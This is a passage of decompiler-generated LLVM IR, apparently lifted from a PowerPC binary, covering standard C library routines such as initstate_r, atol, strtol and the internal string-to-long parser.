  %v0_1000b4f0 = phi i32 [ %v0_1000b4f0.pre, %dec_label_pc_1000b4e8.dec_label_pc_1000b4ec_crit_edge ], [ %v3_1000b494, %dec_label_pc_1000b4e8.preheader ], [ %v3_1000b494, %dec_label_pc_1000b4e8.preheader.thread ]
  %v1_1000b4f4 = phi i32 [ %v0_1000b4ec.pre, %dec_label_pc_1000b4e8.dec_label_pc_1000b4ec_crit_edge ], [ %v0_1000b494, %dec_label_pc_1000b4e8.preheader ], [ %v0_1000b494, %dec_label_pc_1000b4e8.preheader.thread ]
  %v1_1000b4ec = add i32 %v1_1000b4f4, 20
  %v2_1000b4ec = inttoptr i32 %v1_1000b4ec to i32*
  %v3_1000b4ec = load i32, i32* %v2_1000b4ec, align 4
  store i32 %v3_1000b4ec, i32* %r0.global-to-local, align 4
  %v1_1000b4f0 = mul i32 %v0_1000b4f0, 10
  store i32 %v1_1000b4f0, i32* %r31.global-to-local, align 4
  %v2_1000b4f4 = add i32 %v1_1000b4f4, 4
  %v3_1000b4f4 = inttoptr i32 %v2_1000b4f4 to i32*
  store i32 %v0_1000b4f4, i32* %v3_1000b4f4, align 4
  %v0_1000b4f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b4f8 = mul i32 %v0_1000b4f8, 4
  %v0_1000b4fc = load i32, i32* %r10.global-to-local, align 4
  %v2_1000b4fc = add i32 %v0_1000b4fc, %v1_1000b4f8
  store i32 %v2_1000b4fc, i32* %r0.global-to-local, align 4
  %v1_1000b500 = load i32, i32* @r30, align 4
  %v2_1000b500 = inttoptr i32 %v1_1000b500 to i32*
  store i32 %v2_1000b4fc, i32* %v2_1000b500, align 4
  %v2_1000b514 = ptrtoint i32* %stack_var_-24 to i32
  %v0_1000b50c21 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000b50c22 = add i32 %v0_1000b50c21, -1
  store i32 %v1_1000b50c22, i32* @r31, align 4
  %tmp2025 = icmp sgt i32 %v1_1000b50c22, -1
  br i1 %tmp2025, label %dec_label_pc_1000b508, label %dec_label_pc_1000b51c

dec_label_pc_1000b508:                            ; preds = %dec_label_pc_1000b4ec, %dec_label_pc_1000b508
  %v0_1000b51026 = load i32, i32* @r30, align 4
  %v2_1000b508 = inttoptr i32 %v0_1000b51026 to i32*
  %v3_1000b508 = call i32 @__GI_random_r(i32* %v2_1000b508, i32 %v2_1000b514)
  %v0_1000b50c = load i32, i32* @r31, align 4
  %v1_1000b50c = add i32 %v0_1000b50c, -1
  store i32 %v1_1000b50c, i32* @r31, align 4
  %tmp20 = icmp sgt i32 %v1_1000b50c, -1
  br i1 %tmp20, label %dec_label_pc_1000b508, label %dec_label_pc_1000b51c

dec_label_pc_1000b51c:                            ; preds = %dec_label_pc_1000b4ec, %dec_label_pc_1000b508, %dec_label_pc_1000b488
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000b520

dec_label_pc_1000b520:                            ; preds = %entry, %dec_label_pc_1000b51c
  %v0_1000b520 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_1000b51c ]
  store i32 %v0_1000b454, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000b520

; uselistorder directives
  uselistorder i32 %v1_1000b4e8, { 1, 0 }
  uselistorder i32 %v2_1000b4e4, { 1, 0 }
  uselistorder i32 %v2_1000b4d8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000b4c4, { 1, 0 }
  uselistorder i32 %v0_1000b4ac, { 1, 2, 0 }
  uselistorder i32 %v3_1000b494, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r10.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ctr.global-to-local, { 3, 2, 0, 1, 4 }
  uselistorder i32 (i32*, i32)* @__GI_random_r, { 1, 0 }
  uselistorder label %dec_label_pc_1000b520, { 1, 0 }
  uselistorder label %dec_label_pc_1000b51c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000b508, { 1, 0 }
  uselistorder label %dec_label_pc_1000b4ec, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000b4e4, { 1, 0 }
  uselistorder label %dec_label_pc_1000b4c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000b488, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_1000b538 = icmp ugt i32 %arg2, 127
  %v0_1000b540 = load i32, i32* @lr, align 4
  store i32 %v0_1000b540, i32* %r0.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v1_1000b54c = sub i32 255, %arg2
  %v2_1000b54c = sub i32 -1, %arg2
  %not.v5_1000b54c = icmp ugt i32 %v1_1000b54c, %v2_1000b54c
  %v6_1000b550 = sext i1 %not.v5_1000b54c to i32
  store i32 %tmp, i32* %r27.global-to-local, align 4
  %v1_1000b558 = add i32 %tmp, 4
  store i32 %v1_1000b558, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000f6c4.218 to i32), i32* %r11.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  %v1_1000b570 = sub nsw i32 3, %v6_1000b550
  store i32 %v1_1000b570, i32* @r31, align 4
  br i1 %v2_1000b538, label %dec_label_pc_1000b598, label %dec_label_pc_1000b578

dec_label_pc_1000b578:                            ; preds = %entry
  %v2_1000b564 = icmp ugt i32 %arg2, 31
  %v1_1000b578 = sub i32 63, %arg2
  %not.v5_1000b578 = icmp ugt i32 %v1_1000b578, %v2_1000b54c
  %v6_1000b57c = sext i1 %not.v5_1000b578 to i32
  %v1_1000b584 = sub nsw i32 1, %v6_1000b57c
  store i32 %v1_1000b584, i32* @r31, align 4
  br i1 %v2_1000b564, label %dec_label_pc_1000b598, label %dec_label_pc_1000b58c

dec_label_pc_1000b58c:                            ; preds = %dec_label_pc_1000b578
  store i32 22, i32* %r28.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %tmp5 = icmp ult i32 %arg2, 8
  br i1 %tmp5, label %dec_label_pc_1000b5f8, label %dec_label_pc_1000b598

dec_label_pc_1000b598:                            ; preds = %dec_label_pc_1000b58c, %dec_label_pc_1000b578, %entry
  %v0_1000b598 = phi i32 [ 0, %dec_label_pc_1000b58c ], [ %v1_1000b584, %dec_label_pc_1000b578 ], [ %v1_1000b570, %entry ]
  %v1_1000b598 = mul nsw i32 %v0_1000b598, 4
  store i32 %v1_1000b598, i32* %r0.global-to-local, align 4
  %v2_1000b59c = add i32 %arg3, 12
  %v3_1000b59c = inttoptr i32 %v2_1000b59c to i32*
  store i32 %v0_1000b598, i32* %v3_1000b59c, align 4
  %v0_1000b5a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b5a0 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000b5a0 = add i32 %v1_1000b5a0, %v0_1000b5a0
  store i32 %v2_1000b5a0, i32* %r9.global-to-local, align 4
  %v3_1000b5a4 = inttoptr i32 %v2_1000b5a0 to i32*
  %v4_1000b5a4 = load i32, i32* %v3_1000b5a4, align 4
  store i32 %v4_1000b5a4, i32* %r0.global-to-local, align 4
  %v1_1000b5a8 = add i32 %v2_1000b5a0, 20
  %v2_1000b5a8 = inttoptr i32 %v1_1000b5a8 to i32*
  %v3_1000b5a8 = load i32, i32* %v2_1000b5a8, align 4
  store i32 %v3_1000b5a8, i32* %r9.global-to-local, align 4
  %v1_1000b5ac = load i32, i32* %r30.global-to-local, align 4
  %v2_1000b5ac = add i32 %v1_1000b5ac, 20
  %v3_1000b5ac = inttoptr i32 %v2_1000b5ac to i32*
  store i32 %v4_1000b5a4, i32* %v3_1000b5ac, align 4
  %v0_1000b5b0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b5b0 = mul i32 %v0_1000b5b0, 4
  store i32 %v1_1000b5b0, i32* %r0.global-to-local, align 4
  %v0_1000b5b4 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000b5b4 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000b5b4 = add i32 %v1_1000b5b4, 8
  %v3_1000b5b4 = inttoptr i32 %v2_1000b5b4 to i32*
  store i32 %v0_1000b5b4, i32* %v3_1000b5b4, align 4
  %v0_1000b5b8 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000b5b8 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000b5b8 = add i32 %v1_1000b5b8, %v0_1000b5b8
  store i32 %v2_1000b5b8, i32* %r0.global-to-local, align 4
  %v0_1000b5bc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b5bc = load i32, i32* %r30.global-to-local, align 4
  %v2_1000b5bc = add i32 %v1_1000b5bc, 16
  %v3_1000b5bc = inttoptr i32 %v2_1000b5bc to i32*
  store i32 %v0_1000b5bc, i32* %v3_1000b5bc, align 4
  %v0_1000b5c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b5c0 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000b5c0 = add i32 %v1_1000b5c0, 24
  %v3_1000b5c0 = inttoptr i32 %v2_1000b5c0 to i32*
  store i32 %v0_1000b5c0, i32* %v3_1000b5c0, align 4
  store i32 268481992, i32* @lr, align 4
  %v0_1000b5c4 = call i32 @srandom_r()
  %v0_1000b5c8 = load i32, i32* @r31, align 4
  %v3_1000b5c8 = icmp eq i32 %v0_1000b5c8, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000b5d4 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000b5d4 = inttoptr i32 %v1_1000b5d4 to i32*
  store i32 0, i32* %v2_1000b5d4, align 4
  br i1 %v3_1000b5c8, label %dec_label_pc_1000b60c, label %dec_label_pc_1000b5dc

dec_label_pc_1000b5dc:                            ; preds = %dec_label_pc_1000b598
  %v0_1000b5dc = load i32, i32* @r30, align 4
  %v1_1000b5dc = add i32 %v0_1000b5dc, 4
  %v2_1000b5dc = inttoptr i32 %v1_1000b5dc to i32*
  %v3_1000b5dc = load i32, i32* %v2_1000b5dc, align 4
  %v0_1000b5e0 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000b5e0 = sub i32 %v3_1000b5dc, %v0_1000b5e0
  %v4_1000b5e4 = sdiv i32 %v2_1000b5e0, 4
  %v1_1000b5e8 = mul i32 %v4_1000b5e4, 5
  %v1_1000b5ec = load i32, i32* @r31, align 4
  %v2_1000b5ec = add i32 %v1_1000b5e8, %v1_1000b5ec
  store i32 %v2_1000b5ec, i32* %r0.global-to-local, align 4
  %v1_1000b5f0 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000b5f0 = inttoptr i32 %v1_1000b5f0 to i32*
  store i32 %v2_1000b5ec, i32* %v2_1000b5f0, align 4
  br label %dec_label_pc_1000b60c

dec_label_pc_1000b5f8:                            ; preds = %dec_label_pc_1000b58c
  %v0_1000b5f8 = call i32 @__errno_location()
  store i32 %v0_1000b5f8, i32* %r3.global-to-local, align 4
  %v0_1000b5fc = load i32, i32* %r28.global-to-local, align 4
  %v2_1000b5fc = inttoptr i32 %v0_1000b5f8 to i32*
  store i32 %v0_1000b5fc, i32* %v2_1000b5fc, align 4
  %v0_1000b600 = call i32 @__errno_location()
  %v0_1000b604 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000b604 = inttoptr i32 %v0_1000b600 to i32*
  store i32 %v0_1000b604, i32* %v2_1000b604, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b60c

dec_label_pc_1000b60c:                            ; preds = %dec_label_pc_1000b598, %dec_label_pc_1000b5dc, %dec_label_pc_1000b5f8
  store i32 %v0_1000b540, i32* %r0.global-to-local, align 4
  %v0_1000b61c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000b61c

; uselistorder directives
  uselistorder i32 %v2_1000b5a0, { 1, 0, 2 }
  uselistorder i32 %v0_1000b598, { 1, 0 }
  uselistorder i32 %v2_1000b54c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 ()* @srandom_r, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1000f6c4.218 to i32), { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 2, 3, 0, 5, 4 }
  uselistorder label %dec_label_pc_1000b60c, { 2, 1, 0 }
}

define i32 @atol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r4, align 4
  store i32 10, i32* @r5, align 4
  %v2_1000b628 = call i32 @strtol(i32 0, i32 10)
  ret i32 %v2_1000b628
}

define i32 @strtol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 1, i32* @r6, align 4
  %v2_1000b630 = call i32 @_stdlib_strto_l(i8* inttoptr (i32 1 to i8*))
  ret i32 %v2_1000b630
}

define i32 @_stdlib_strto_l(i8* %arg1) local_unnamed_addr {
entry:
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000b644 = load i32, i32* @r4, align 4
  store i32 %v0_1000b644, i32* %r25.global-to-local, align 4
  %v0_1000b64c = load i32, i32* @r5, align 4
  store i32 %v0_1000b64c, i32* %r30.global-to-local, align 4
  %v0_1000b650 = load i32, i32* @r6, align 4
  store i32 %v0_1000b650, i32* %r26.global-to-local, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_1000b658 = load i32, i32* @global_var_1001fd68, align 4
  br label %dec_label_pc_1000b664

dec_label_pc_1000b660:                            ; preds = %dec_label_pc_1000b664
  %v1_1000b660 = add i32 %v0_1000b698, 1
  store i32 %v1_1000b660, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000b664

dec_label_pc_1000b664:                            ; preds = %entry, %dec_label_pc_1000b660
  %v0_1000b698 = phi i32 [ %tmp, %entry ], [ %v1_1000b660, %dec_label_pc_1000b660 ]
  %v1_1000b664 = inttoptr i32 %v0_1000b698 to i8*
  %v2_1000b664 = load i8, i8* %v1_1000b664, align 1
  %v3_1000b664 = zext i8 %v2_1000b664 to i32
  %v1_1000b668 = mul nuw nsw i32 %v3_1000b664, 2
  %v2_1000b66c = add i32 %v1_1000b668, %v3_1000b658
  %v3_1000b66c = inttoptr i32 %v2_1000b66c to i16*
  %v4_1000b66c = load i16, i16* %v3_1000b66c, align 2
  %v1_1000b670 = and i16 %v4_1000b66c, 32
  %v3_1000b670 = icmp eq i16 %v1_1000b670, 0
  br i1 %v3_1000b670, label %dec_label_pc_1000b678, label %dec_label_pc_1000b660

dec_label_pc_1000b678:                            ; preds = %dec_label_pc_1000b664
  %v3_1000b678 = icmp eq i8 %v2_1000b664, 43
  br i1 %v3_1000b678, label %dec_label_pc_1000b698, label %dec_label_pc_1000b680

dec_label_pc_1000b680:                            ; preds = %dec_label_pc_1000b678
  %v3_1000b680 = icmp eq i8 %v2_1000b664, 45
  store i32 0, i32* %r28.global-to-local, align 4
  br i1 %v3_1000b680, label %dec_label_pc_1000b698, label %dec_label_pc_1000b69c

dec_label_pc_1000b698:                            ; preds = %dec_label_pc_1000b678, %dec_label_pc_1000b680
  %storemerge = phi i32 [ 1, %dec_label_pc_1000b680 ], [ 0, %dec_label_pc_1000b678 ]
  store i32 %storemerge, i32* %r28.global-to-local, align 4
  %v1_1000b698 = add i32 %v0_1000b698, 1
  store i32 %v1_1000b698, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000b69c

dec_label_pc_1000b69c:                            ; preds = %dec_label_pc_1000b680, %dec_label_pc_1000b698
  %v1_1000b69c = call i32 @__asm_rlwinm.(i32 %v0_1000b64c, i32 0, i32 28, i32 26)
  %v4_1000b69c = icmp eq i32 %v1_1000b69c, 0
  br i1 %v4_1000b69c, label %dec_label_pc_1000b6a8, label %dec_label_pc_1000b69c.dec_label_pc_1000b6e4_crit_edge

dec_label_pc_1000b69c.dec_label_pc_1000b6e4_crit_edge: ; preds = %dec_label_pc_1000b69c
  %v0_1000b6e4.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000b6e4

dec_label_pc_1000b6a8:                            ; preds = %dec_label_pc_1000b69c
  %v0_1000b6a8 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000b6a8 = inttoptr i32 %v0_1000b6a8 to i8*
  %v2_1000b6a8 = load i8, i8* %v1_1000b6a8, align 1
  %v0_1000b6ac = load i32, i32* %r30.global-to-local, align 4
  %v1_1000b6ac = add i32 %v0_1000b6ac, 10
  store i32 %v1_1000b6ac, i32* %r30.global-to-local, align 4
  %v3_1000b6b0 = icmp eq i8 %v2_1000b6a8, 48
  br i1 %v3_1000b6b0, label %dec_label_pc_1000b6b8, label %dec_label_pc_1000b6d8

dec_label_pc_1000b6b8:                            ; preds = %dec_label_pc_1000b6a8
  %v1_1000b6b8 = add i32 %v0_1000b6a8, 1
  %v2_1000b6b8 = inttoptr i32 %v1_1000b6b8 to i8*
  %v3_1000b6b8 = load i8, i8* %v2_1000b6b8, align 1
  %v4_1000b6b8 = zext i8 %v3_1000b6b8 to i32
  store i32 %v1_1000b6b8, i32* %r31.global-to-local, align 4
  %v1_1000b6bc = add i32 %v0_1000b6ac, 8
  store i32 %v1_1000b6bc, i32* %r30.global-to-local, align 4
  %v1_1000b6c0 = or i32 %v4_1000b6b8, 32
  %v3_1000b6c8 = icmp eq i32 %v1_1000b6c0, 120
  br i1 %v3_1000b6c8, label %dec_label_pc_1000b6d0, label %dec_label_pc_1000b6d8

dec_label_pc_1000b6d0:                            ; preds = %dec_label_pc_1000b6b8
  %v1_1000b6d0 = mul i32 %v1_1000b6bc, 2
  store i32 %v1_1000b6d0, i32* %r30.global-to-local, align 4
  %v1_1000b6d4 = add i32 %v0_1000b6a8, 2
  store i32 %v1_1000b6d4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000b6d8

dec_label_pc_1000b6d8:                            ; preds = %dec_label_pc_1000b6b8, %dec_label_pc_1000b6a8, %dec_label_pc_1000b6d0
  %v0_1000b78c15 = phi i32 [ %v1_1000b6b8, %dec_label_pc_1000b6d0 ], [ %tmp, %dec_label_pc_1000b6a8 ], [ %v1_1000b6b8, %dec_label_pc_1000b6b8 ]
  %v0_1000b6d8 = phi i32 [ %v1_1000b6d0, %dec_label_pc_1000b6d0 ], [ %v1_1000b6ac, %dec_label_pc_1000b6a8 ], [ %v1_1000b6bc, %dec_label_pc_1000b6b8 ]
  %tmp22 = icmp slt i32 %v0_1000b6d8, 17
  br i1 %tmp22, label %dec_label_pc_1000b6e4, label %dec_label_pc_1000b6e0

dec_label_pc_1000b6e0:                            ; preds = %dec_label_pc_1000b6d8
  store i32 16, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000b6e4

dec_label_pc_1000b6e4:                            ; preds = %dec_label_pc_1000b69c.dec_label_pc_1000b6e4_crit_edge, %dec_label_pc_1000b6d8, %dec_label_pc_1000b6e0
  %v0_1000b78c14 = phi i32 [ %tmp, %dec_label_pc_1000b69c.dec_label_pc_1000b6e4_crit_edge ], [ %v0_1000b78c15, %dec_label_pc_1000b6d8 ], [ %v0_1000b78c15, %dec_label_pc_1000b6e0 ]
  %v1_1000b6f8 = phi i32 [ %v0_1000b6e4.pre, %dec_label_pc_1000b69c.dec_label_pc_1000b6e4_crit_edge ], [ %v0_1000b6d8, %dec_label_pc_1000b6d8 ], [ 16, %dec_label_pc_1000b6e0 ]
  %v1_1000b6e4 = add i32 %v1_1000b6f8, -2
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_1000b6ec = icmp ugt i32 %v1_1000b6e4, 34
  br i1 %v2_1000b6ec, label %dec_label_pc_1000b784, label %dec_label_pc_1000b6f4

dec_label_pc_1000b6f4:                            ; preds = %dec_label_pc_1000b6e4
  %v2_1000b6f8 = udiv i32 -1, %v1_1000b6f8
  store i32 %v2_1000b6f8, i32* %r29.global-to-local, align 4
  %v2_1000b6fc = mul i32 %v2_1000b6f8, %v1_1000b6f8
  %v1_1000b700 = sub i32 -1, %v2_1000b6fc
  %v1_1000b704 = urem i32 %v1_1000b700, 256
  store i32 %v1_1000b704, i32* %r27.global-to-local, align 4
  %v0_1000b710.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000b710

dec_label_pc_1000b70c:                            ; preds = %dec_label_pc_1000b778, %dec_label_pc_1000b760
  %v1_1000b714.pre = phi i32 [ %v1_1000b718, %dec_label_pc_1000b778 ], [ %v1_1000b714.pre.pre, %dec_label_pc_1000b760 ]
  %v0_1000b714.pre = phi i32 [ %v2_1000b77c, %dec_label_pc_1000b778 ], [ %v0_1000b714.pre.pre, %dec_label_pc_1000b760 ]
  %v0_1000b70c = phi i32 [ %v1_1000b71c, %dec_label_pc_1000b778 ], [ %v0_1000b70c.pre, %dec_label_pc_1000b760 ]
  br label %dec_label_pc_1000b710

dec_label_pc_1000b710:                            ; preds = %dec_label_pc_1000b6f4, %dec_label_pc_1000b70c
  %v0_1000b78c12 = phi i32 [ %v0_1000b78c14, %dec_label_pc_1000b6f4 ], [ %v0_1000b70c, %dec_label_pc_1000b70c ]
  %v0_1000b71c = phi i32 [ %v0_1000b710.pre, %dec_label_pc_1000b6f4 ], [ %v0_1000b70c, %dec_label_pc_1000b70c ]
  %v1_1000b718 = phi i32 [ %v2_1000b6f8, %dec_label_pc_1000b6f4 ], [ %v1_1000b714.pre, %dec_label_pc_1000b70c ]
  %v0_1000b778 = phi i32 [ 0, %dec_label_pc_1000b6f4 ], [ %v0_1000b714.pre, %dec_label_pc_1000b70c ]
  %v1_1000b710 = inttoptr i32 %v0_1000b71c to i8*
  %v2_1000b710 = load i8, i8* %v1_1000b710, align 1
  %v3_1000b710 = zext i8 %v2_1000b710 to i32
  %v3_1000b714 = icmp ugt i32 %v0_1000b778, %v1_1000b718
  %v1_1000b71c = add i32 %v0_1000b71c, 1
  store i32 %v1_1000b71c, i32* %r31.global-to-local, align 4
  %v1_1000b720 = add nsw i32 %v3_1000b710, -48
  %v1_1000b724 = or i32 %v3_1000b710, 32
  %v1_1000b728 = urem i32 %v1_1000b720, 256
  %tmp23 = icmp ult i32 %v1_1000b728, 10
  br i1 %tmp23, label %dec_label_pc_1000b748, label %dec_label_pc_1000b738

dec_label_pc_1000b738:                            ; preds = %dec_label_pc_1000b710
  %tmp24 = icmp ult i32 %v1_1000b724, 97
  br i1 %tmp24, label %dec_label_pc_1000b748, label %dec_label_pc_1000b744

dec_label_pc_1000b744:                            ; preds = %dec_label_pc_1000b738
  %v1_1000b738 = add nsw i32 %v1_1000b724, -87
  %v1_1000b744 = urem i32 %v1_1000b738, 256
  br label %dec_label_pc_1000b748

dec_label_pc_1000b748:                            ; preds = %dec_label_pc_1000b738, %dec_label_pc_1000b710, %dec_label_pc_1000b744
  %v1_1000b77c = phi i32 [ 40, %dec_label_pc_1000b738 ], [ %v1_1000b728, %dec_label_pc_1000b710 ], [ %v1_1000b744, %dec_label_pc_1000b744 ]
  %v1_1000b748 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000b748 = icmp slt i32 %v1_1000b77c, %v1_1000b748
  br i1 %v2_1000b748, label %dec_label_pc_1000b750, label %dec_label_pc_1000b784

dec_label_pc_1000b750:                            ; preds = %dec_label_pc_1000b748
  br i1 %v3_1000b714, label %dec_label_pc_1000b760, label %dec_label_pc_1000b754

dec_label_pc_1000b754:                            ; preds = %dec_label_pc_1000b750
  %v1_1000b754 = load i32, i32* %r27.global-to-local, align 4
  %v0_1000b758.not = icmp ne i32 %v0_1000b778, %v1_1000b718
  %tmp25 = icmp ule i32 %v1_1000b77c, %v1_1000b754
  %or.cond = or i1 %tmp25, %v0_1000b758.not
  br i1 %or.cond, label %dec_label_pc_1000b778, label %dec_label_pc_1000b760

dec_label_pc_1000b760:                            ; preds = %dec_label_pc_1000b754, %dec_label_pc_1000b750
  %v0_1000b760 = call i32 @__errno_location()
  %v0_1000b764 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000b764 = load i32, i32* %r26.global-to-local, align 4
  %v2_1000b764 = and i32 %v1_1000b764, %v0_1000b764
  store i32 %v2_1000b764, i32* %r28.global-to-local, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  %v2_1000b770 = inttoptr i32 %v0_1000b760 to i32*
  store i32 34, i32* %v2_1000b770, align 4
  %v0_1000b70c.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_1000b714.pre.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_1000b714.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000b70c

dec_label_pc_1000b778:                            ; preds = %dec_label_pc_1000b754
  %v2_1000b778 = mul i32 %v1_1000b748, %v0_1000b778
  %v2_1000b77c = add i32 %v2_1000b778, %v1_1000b77c
  store i32 %v2_1000b77c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000b70c

dec_label_pc_1000b784:                            ; preds = %dec_label_pc_1000b748, %dec_label_pc_1000b6e4
  %v0_1000b78c = phi i32 [ %v0_1000b78c14, %dec_label_pc_1000b6e4 ], [ %v0_1000b78c12, %dec_label_pc_1000b748 ]
  %v0_1000b784 = load i32, i32* %r25.global-to-local, align 4
  %v3_1000b784 = icmp eq i32 %v0_1000b784, 0
  br i1 %v3_1000b784, label %dec_label_pc_1000b790, label %dec_label_pc_1000b78c

dec_label_pc_1000b78c:                            ; preds = %dec_label_pc_1000b784
  %v2_1000b78c = inttoptr i32 %v0_1000b784 to i32*
  store i32 %v0_1000b78c, i32* %v2_1000b78c, align 4
  br label %dec_label_pc_1000b790

dec_label_pc_1000b790:                            ; preds = %dec_label_pc_1000b784, %dec_label_pc_1000b78c
  %v0_1000b790 = load i32, i32* %r26.global-to-local, align 4
  %v3_1000b790 = icmp eq i32 %v0_1000b790, 0
  %v0_1000b794 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000b794 = sub i32 0, %v0_1000b794
  %tmp27 = lshr i32 %v1_1000b794, 31
  %tmp28 = add nuw i32 %tmp27, 2147483647
  store i32 %tmp28, i32* @r31, align 4
  %v0_1000b7d4.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v3_1000b790, label %dec_label_pc_1000b7c4, label %dec_label_pc_1000b7ac

dec_label_pc_1000b7ac:                            ; preds = %dec_label_pc_1000b790
  %v3_1000b7ac = icmp ugt i32 %v0_1000b7d4.pre.pre, %tmp28
  br i1 %v3_1000b7ac, label %dec_label_pc_1000b7b4, label %dec_label_pc_1000b7c4

dec_label_pc_1000b7b4:                            ; preds = %dec_label_pc_1000b7ac
  %v0_1000b7b4 = call i32 @__errno_location()
  %v2_1000b7bc = inttoptr i32 %v0_1000b7b4 to i32*
  store i32 34, i32* %v2_1000b7bc, align 4
  %v0_1000b7c0 = load i32, i32* @r31, align 4
  store i32 %v0_1000b7c0, i32* %r8.global-to-local, align 4
  %v0_1000b7c4.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000b7c4

dec_label_pc_1000b7c4:                            ; preds = %dec_label_pc_1000b790, %dec_label_pc_1000b7ac, %dec_label_pc_1000b7b4
  %v0_1000b7d4.pre = phi i32 [ %v0_1000b7d4.pre.pre, %dec_label_pc_1000b7ac ], [ %v0_1000b7c0, %dec_label_pc_1000b7b4 ], [ %v0_1000b7d4.pre.pre, %dec_label_pc_1000b790 ]
  %v0_1000b7c4 = phi i32 [ %v0_1000b794, %dec_label_pc_1000b7ac ], [ %v0_1000b7c4.pre, %dec_label_pc_1000b7b4 ], [ %v0_1000b794, %dec_label_pc_1000b790 ]
  %v3_1000b7c4 = icmp eq i32 %v0_1000b7c4, 0
  br i1 %v3_1000b7c4, label %dec_label_pc_1000b7d0, label %dec_label_pc_1000b7cc

dec_label_pc_1000b7cc:                            ; preds = %dec_label_pc_1000b7c4
  %v1_1000b7cc = sub i32 0, %v0_1000b7d4.pre
  store i32 %v1_1000b7cc, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000b7d0

dec_label_pc_1000b7d0:                            ; preds = %dec_label_pc_1000b7c4, %dec_label_pc_1000b7cc
  %v0_1000b7d4 = phi i32 [ %v1_1000b7cc, %dec_label_pc_1000b7cc ], [ %v0_1000b7d4.pre, %dec_label_pc_1000b7c4 ]
  ret i32 %v0_1000b7d4

; uselistorder directives
  uselistorder i32 %v0_1000b7d4.pre, { 1, 0 }
  uselistorder i32 %v0_1000b7d4.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_1000b77c, { 1, 0 }
  uselistorder i32 %v1_1000b728, { 1, 0 }
  uselistorder i32 %v1_1000b724, { 1, 0 }
  uselistorder i32 %v1_1000b71c, { 1, 0 }
  uselistorder i32 %v3_1000b710, { 1, 0 }
  uselistorder i32 %v0_1000b778, { 1, 0, 2 }
  uselistorder i32 %v1_1000b718, { 0, 2, 1 }
  uselistorder i32 %v0_1000b70c, { 1, 0 }
  uselistorder i32 %v2_1000b6f8, { 1, 0, 2 }
